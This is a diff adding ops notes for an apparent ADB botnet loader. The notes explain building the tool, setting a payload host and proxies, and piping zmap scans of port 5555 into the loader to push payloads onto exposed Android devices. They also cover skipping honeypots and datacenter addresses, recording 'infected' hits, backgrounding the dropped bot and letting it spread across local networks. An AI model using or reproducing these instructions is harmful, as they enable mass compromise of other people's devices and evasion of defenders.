@@ -1,0 +1,40 @@
+ADB loader — quick ops notes
+See README.md for full documentation.
+
+Build (Go 1.24+ required; older distro Go packages are too old):
+  export PATH=/usr/local/go/bin:$PATH
+  go mod tidy
+  go build -o adb .
+
+Before running, edit:
+  payloads.txt  — set YOUR_PAYLOAD_HOST (HTTP base URL for main_arm64 / main_arm7)
+  proxies.txt   — one SOCKS5 proxy per line (no http:// prefix)
+                  example: username:password@proxy.example.com:1080
+                  Use your provider's SOCKS5 port (not HTTP-only).
+
+Required — use spread.sh (zmap alone finds IPs but does not load them):
+  chmod +x spread.sh stop-spread.sh adb
+  screen -S adb
+  cd /path/to/adb-proxy
+  ./spread.sh
+  Ctrl+A D          detach
+  ./stop-spread.sh  stop
+
+Verify both processes:
+  pgrep -af 'zmap -p 5555'
+  pgrep -af './adb 5555'
+
+Do NOT:
+  run zmap alone, adb alone, or a broken pipe
+  run adb from a TTY — stdin must be a pipe from zmap
+
+Metrics:
+  ShellOK / hits.txt  = payload shell/exec accepted (not the same as a live C2 bot)
+  SkipTrap            = likely honeypot CNXN banner
+  SkipDC              = datacenter IP skipped (default -skip-cloud)
+  shell: fails → exec: fallback; -skip-trap / -skip-cloud can be disabled
+
+Default payloads.txt: one line, getprop ABI, >80KB check, setsid/nohup background.
+Optional: ./adb 5555 -j 500 --hits infected.txt
+
+Dropped bot may LAN-spread via ../bot/adb_spread.c (private /24 only).
